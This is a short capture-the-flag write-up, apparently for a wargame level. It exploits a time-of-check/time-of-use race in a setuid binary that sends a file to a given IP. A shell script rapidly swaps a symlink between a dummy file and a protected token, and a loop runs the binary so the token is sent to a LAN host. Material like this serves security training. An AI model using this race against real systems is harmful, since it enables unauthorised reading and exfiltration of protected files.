# Level10

We have a binary which send the content of a file to an ip address on port 6969
It checks if we have access to the file and send its content.

The check is made by `access` with the flag `4` = `R_OK` so just check if it can be read

Lets try to create a symlink => `ln -s /home/user/level08/token /tmp/test` but it doesnt work.

The program is using access to check if we can open the file
and then open the file but `open` open the file as the user it is executed with so `flag10`.
So we can try to catch the small amount of time between `access` and `open` to switch to file being read.
Lets create a script:
```shell
#!/bin/sh

echo -n "" > /tmp/test

counter=0
while true; do
    
    ln -sf /tmp/test /tmp/magic
    ln -sf /home/user/level10/token /tmp/magic
    counter=$((counter + 1))
    printf "\r[%d] - Running...                          " "$counter"
done
```

```shell
while true; do ./level10 /tmp/magic 192.168.1.88; done
```